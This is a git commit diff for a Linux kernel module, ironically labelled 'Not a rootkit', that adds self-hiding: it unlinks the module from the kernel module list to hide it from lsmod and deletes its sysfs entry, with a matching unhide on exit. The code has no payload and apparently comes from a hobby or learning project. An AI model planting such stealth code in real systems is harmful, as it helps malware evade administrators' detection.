bb79bab385ef2e0b390fde33d118cdf4b09d3f84
Yanay Goor <yanay.goor@gmail.com>
2020-08-07 09:57:01 -0700

    added self hiding - WIP v2

--- src/main.c
+++ src/main.c
@@ -7,24 +7,39 @@ MODULE_AUTHOR("Yanay Goor");
 MODULE_DESCRIPTION("Not a rootkit");
 MODULE_VERSION("0.1.0");
 
-static hide_module(void) {
-	// hide from lsmod
+static struct list_head *modules;
+
+static void hide_module(void) {
+    // Save the list for later so we can add the module back in.
+	modules = THIS_MODULE->list.prev;
+	// Hide from procfs (lsmod)
+	// TODO: This means that rmmod will not work, I need to provide a way for the module to unload itself.
 	list_del(&THIS_MODULE->list);
-	// hide from sysfs (/sys/module)
-	// kobject_del(&THIS_MODULE->mkobj.kobj);
+	// Hide from sysfs (/sys/module)
+	// kobject_del removes the kobject from the sysfs but does
+	// not free it's memory (that only happens one the refcount is 0).
+	// So it is save to call without causing an error later on when unloading the module.
+	 kobject_del(&THIS_MODULE->mkobj.kobj);
 	// ???
 	// THIS_MODULE->sect_attrs = NULL;
 	// ???
 	// THIS_MODULE->notes_attrs = NULL;
 }
 
-static int __init MRK_initialize(void) {
+static void unhide_module(void) {
+	// Unhide from procfs (lsmod)
+	list_add(&THIS_MODULE->list, modules);
+}
+
+static int __init initialize(void) {
+	hide_module();
 	printk(KERN_INFO "Hello, World!\n");
 	return 0;
 }
 
 
-static void __exit MRK_exit(void) {
+static void __exit exit(void) {
+    unhide_module();
 	printk(KERN_INFO "Goodbye, World!\n");
 }
 
